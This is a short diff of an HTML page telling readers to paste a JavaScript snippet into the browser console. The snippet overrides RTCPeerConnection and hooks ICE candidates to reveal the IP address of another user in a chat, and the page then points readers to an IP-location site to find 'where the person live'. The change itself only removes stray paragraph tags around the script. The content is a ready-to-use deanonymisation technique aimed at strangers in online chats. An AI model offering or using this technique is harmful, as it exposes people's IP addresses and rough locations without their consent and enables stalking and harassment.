@@ -10,7 +10,7 @@
     <p>Then press "Console"</p>
     <p>Then paste this script:</p>
     window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection
-<p>
+
 window.RTCPeerConnection = function(...args) {
  const pc = new window.oRTCPeerConnection(...args)
 
@@ -28,7 +28,7 @@ return pc.oaddIceCandidate(iceCandidate, ...rest)
 
 return pc
 }
-</p>
+
     If you did that press "Enter"
     Then <b>DON'T</b> close the inspect element. Just go into a chat and you see the IP
     If you want to know where the person live go to this site: https://dnschecker.org/ip-location.php?ip and paste his ip there!
